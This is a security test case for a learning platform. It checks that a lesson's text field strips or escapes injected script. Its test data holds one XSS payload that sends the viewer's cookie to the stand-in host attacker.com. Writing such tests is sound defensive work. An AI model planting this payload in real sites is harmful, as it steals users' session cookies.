---
tc_id: TC-LM-022
title: Content Validation - Text Lesson with Script Injection
priority: High
status: Ready
type: Security
linked_requirement: REQ-002
tags:
  - test-case
  - content-validation
  - security
  - negative
---

# Test Data
| Field | Value |
| ----- | ----- |
| Lesson Title | Secure Lesson |
| Description/Text Content | <script>alert('xss');document.location='http://attacker.com/steal?cookie='+document.cookie;</script> |
| Question Title | Quiz |
| Success Rate | 70 |

# Preconditions
- Admin attempts to input malicious code into Description to check XSS filter.

# Steps
1. Enter the script tag in the Description/Text Content field.
2. Complete other fields and click 'Save'.
3. Navigate to the created lesson as a Student.

# Expected Result
- The script is either stripped out on the server side, or securely HTML-escaped so that when a Student views the lesson, it renders as plain text without executing any JavaScript.

# Notes

# Attachments
